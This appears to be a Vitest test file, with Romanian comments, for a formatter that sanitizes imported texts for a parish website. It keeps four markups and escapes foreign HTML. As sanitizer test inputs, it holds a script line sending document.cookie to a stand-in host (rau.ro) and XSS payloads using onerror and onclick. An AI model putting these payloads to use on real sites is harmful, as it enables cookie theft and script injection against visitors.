import { describe, expect, it } from 'vitest'
// @ts-expect-error — modul JS al importului, fără typings; probele îl folosesc ca atare
import { blocDinMarkdown, blocuriDinHtml, ent, faraSentinele, imbraca, siguranta } from '../infrastructure/import/chinonic/formatare.mjs'

/**
 * FORMATAREA MINIMĂ a textelor citite la chinonic (user, 16.09.2026: „text raw cu formatare minimă —
 * bold, italic, liste —, fără nimic din site-ul destinatar"; iar la întrebarea ce se face cu
 * subtitlurile: „paragraf bold").
 *
 * Două feluri de probe stau aici, și amândouă păzesc lucruri care se strică în tăcere:
 *   - ce se PĂSTREAZĂ: patru marcaje și nimic mai mult. O regulă schimbată din neatenție ar scoate
 *     versurile și replicile din text (așa s-au pierdut până acum: orice rând sub 60 de semne se
 *     arunca) ori, invers, ar aduce în pagină podoaba site-ului sursă.
 *   - ce NU are voie să intre: HTML străin. Textele vin de pe zeci de site-uri, unele foarte vechi;
 *     dacă drumul de aici s-ar strica, un `<script>` de pe alt site ar ajunge în pagina parohiei, iar
 *     nimic din pagină n-ar arăta stricat.
 */

const html = (h: string, citat = false) => imbraca(blocuriDinHtml(h, citat))
const md = (linii: string[]) => imbraca(linii.map(blocDinMarkdown).filter(Boolean))

describe('din HTML de email se păstrează patru marcaje', () => {
  it('îngroșarea și înclinarea rămân, restul etichetelor pleacă', () => {
    const h = html('<p style="color:#000">Un text cu <strong>îngroșat</strong> și <em>înclinat</em>.</p>')
    expect(h).toBe('<p>Un text cu <strong>îngroșat</strong> și <em>înclinat</em>.</p>')
  })

  it('`<b>` și `<i>` sunt aceleași lucruri scrise altfel', () => {
    expect(html('<p>Cu <b>una</b> și <i>alta</i>.</p>')).toContain('<strong>una</strong>')
    expect(html('<p>Cu <b>una</b> și <i>alta</i>.</p>')).toContain('<em>alta</em>')
  })

  it('rândurile de listă se strâng într-o singură listă', () => {
    expect(html('<ul><li>unu</li><li>doi</li><li>trei</li></ul>'))
      .toBe('<ul><li>unu</li><li>doi</li><li>trei</li></ul>')
  })

  it('celula de citat a buletinului devine citat, lângă textul obișnuit', () => {
    const h = imbraca([
      ...blocuriDinHtml('<p>Ce spune autorul, cu vorbele lui.</p>'),
      ...blocuriDinHtml('<p>Un gând al altcuiva.</p><p>Și încă unul.</p>', true),
    ])
    expect(h).toContain('<blockquote><p>Un gând al altcuiva.</p><p>Și încă unul.</p></blockquote>')
    expect(h.indexOf('Ce spune autorul')).toBeLessThan(h.indexOf('blockquote'))
  })

  /**
   * ⚠️ UN CITAT CARE E TOT TEXTUL nu mai e un citat, e textul. În buletin se întâmplă des: redactorul
   * a pus articolul întreg în stilul de citat al editorului. Lăsat așa, fișa ar avea o dungă pe lângă
   * fiecare rând al ei — și încă una a fragmentului pe deasupra.
   */
  it('citatul care e tot textul se dezbracă', () => {
    const doua = imbraca([{ fel: 'citat', text: 'unu' }, { fel: 'citat', text: 'doi' }])
    expect(doua).not.toContain('blockquote')
    expect(doua).toBe('<p>unu</p>\n<p>doi</p>')
  })
})

/**
 * ⚠️⚠️ SUBTITLURILE DEVIN PARAGRAF ÎNGROȘAT (hotărârea userului, 16.09.2026, întrebat anume:
 * „paragraf bold"). Nu `<h2>`: un titlu de secțiune din alt site n-are ce căuta în ierarhia paginii
 * noastre, unde `<h1>` e titlul articolului.
 */
describe('subtitlul e paragraf îngroșat', () => {
  it('un rând îngroșat de la un cap la altul e subtitlu', () => {
    expect(html('<p><strong>Despre rugăciune</strong></p>'))
      .toBe('<p class="ch-sub"><strong>Despre rugăciune</strong></p>')
  })

  it('titlul de secțiune din markdown e tot paragraf îngroșat, nu `<h2>`', () => {
    const h = md(['## Despre rugăciune'])
    expect(h).toBe('<p class="ch-sub"><strong>Despre rugăciune</strong></p>')
    expect(h).not.toContain('<h')
  })

  it('⚠️ un paragraf lung, îngroșat tot, NU e subtitlu — e proză apăsată', () => {
    const lung = `<p><strong>${'Cuvânt apăsat despre răbdare și despre nădejdea care nu se rușinează. '.repeat(3)}</strong></p>`
    const h = html(lung)
    expect(h).not.toContain('ch-sub')
    expect(h).toContain('<strong>')
  })
})

describe('din markdown se păstrează aceleași patru marcaje', () => {
  it('îngroșarea, înclinarea, listele și citatul', () => {
    expect(md(['Un rând cu **tare** și *aplecat*.'])).toContain('<strong>tare</strong>')
    expect(md(['Un rând cu **tare** și *aplecat*.'])).toContain('<em>aplecat</em>')
    expect(md(['- unu', '- doi'])).toBe('<ul><li>unu</li><li>doi</li></ul>')
    expect(md(['1. unu', '2. doi'])).toBe('<ul><li>unu</li><li>doi</li></ul>')
    expect(md(['> un gând al altcuiva'])).toBe('<blockquote><p>un gând al altcuiva</p></blockquote>')
  })

  it('⚠️ scăpările uneltei de conversie nu ascund marcajele', () => {
    // `tomarkdown` scrie `\*\*tare\*\*`: fără scoaterea scăpărilor, îngroșarea se pierdea
    expect(md(['Un rând cu \\*\\*tare\\*\\* în el.'])).toContain('<strong>tare</strong>')
  })

  it('⚠️ adresele ies, dar cuvântul legăturii rămâne — referințele se păstrează', () => {
    const h = md(['Vezi [Psalmul 18](https://biblia.ro/ps/18) și www.altundeva.ro, dar (Matei 5, 22) rămâne.'])
    expect(h).toContain('Psalmul 18')
    expect(h).toContain('(Matei 5, 22)')
    expect(h).not.toContain('biblia.ro')
    expect(h).not.toContain('altundeva.ro')
  })

  it('pozele pleacă de tot: nu sunt text de citit', () => {
    expect(md(['![o poză](https://site.ro/poza.jpg) Text de după poză.'])).toBe('<p>Text de după poză.</p>')
  })
})

/**
 * ⚠️⚠️ NIMIC STRĂIN NU AJUNGE ÎN PAGINĂ CA HTML. Textele vin de pe zeci de site-uri; dacă drumul de
 * aici s-ar strica, un `<script>` de pe alt site ar intra în pagina parohiei — și nimic n-ar arăta
 * stricat. Drumul: marcajele care au voie se prefac în semne de control, restul etichetelor se taie,
 * textul se escapează ÎNTREG, iar abia la urmă semnele devin iar etichete — ale noastre.
 */
describe('⚠️ HTML-ul străin nu trece', () => {
  it('scriptul dispare, cu tot ce e în el', () => {
    const h = html('<p>Text bun.</p><script>fetch("https://rau.ro?c="+document.cookie)</script>')
    expect(h).not.toContain('<script')
    expect(h).not.toContain('document.cookie')
  })

  it('o etichetă scrisă ca text rămâne text, nu devine etichetă', () => {
    const h = md(['Aici se scrie <script>rău</script> și <img src=x onerror=alert(1)> ca pildă, într-un rând lung.'])
    expect(h).not.toContain('<script')
    expect(h).not.toContain('onerror')
  })

  it('semnele care fac HTML se escapează, oriunde ar veni', () => {
    expect(siguranta('a < b & c > d "e"')).toBe('a &lt; b &amp; c &gt; d &quot;e&quot;')
  })

  it('⚠️ marcajul neînchis se aruncă întreg, ca să nu curgă peste restul paginii', () => {
    // editorul de email rupe des îngroșarea; un `<strong>` deschis și niciodată închis ar îngroșa
    // tot ce vine după el
    const h = html('<p>Un rând cu <strong>îngroșare care nu se mai închide, și merge înainte.</p>')
    expect(h).not.toContain('<strong>')
    expect(h).toContain('îngroșare care nu se mai închide')
  })

  it('un atribut nu poate ieși din ghilimelele lui', () => {
    expect(siguranta('" onclick="alert(1)')).not.toContain('onclick="alert(1)"')
  })
})

/**
 * ENTITĂȚILE. ⚠️ Se decodează de DOUĂ ori: 45 de fragmente vechi au entitatea codată de două ori la
 * trimitere (`&amp;atilde;`), iar o singură trecere lăsa „&atilde;" în textul curat. Fără asta,
 * potrivirea cu fragmentul cădea și textul adus rămânea „nesigur".
 */
describe('entitățile se citesc, nu se scriu mai departe', () => {
  it('codarea dublă a arhivei vechi se desface', () => {
    expect(ent('cre&amp;scedil;tinii')).toBe('creștinii')
    expect(ent('s-a n&acirc;scut')).toBe('s-a nâscut')
  })

  it('⚠️ `&not;` și `&shy;` se aruncă: în arhiva asta țin locul cratimei de despărțire', () => {
    expect(ent('cres&not;tinii')).toBe('crestinii')
    expect(ent('cres&shy;tinii')).toBe('crestinii')
  })

  it('literele grecești și cele cu semne se scriu cu litera lor', () => {
    expect(ent('&alpha;&gamma;&alpha;&pi;&eta;')).toBe('αγαπη')
    expect(ent('&Omega;')).toBe('Ω')
    expect(ent('caf&eacute;')).toBe('café')
  })

  it('nu rămân entități nedecodate în textul pus în pagină', () => {
    expect(html('<p>Un text cu &amp;not; și &icirc;n el, destul de lung.</p>')).not.toMatch(/&amp;[a-z]+;/)
  })
})

describe('măsurarea textului nu numără marcajele', () => {
  it('textul gol de sentinele e cel care se compară și se măsoară', () => {
    const b = blocDinMarkdown('Un rând cu **tare** în el.')
    expect(faraSentinele(b.text)).toBe('Un rând cu tare în el.')
  })

  it('rândurile goale ori de un singur semn nu fac bloc', () => {
    expect(blocDinMarkdown('   ')).toBe(null)
    expect(blocDinMarkdown('*')).toBe(null)
  })
})
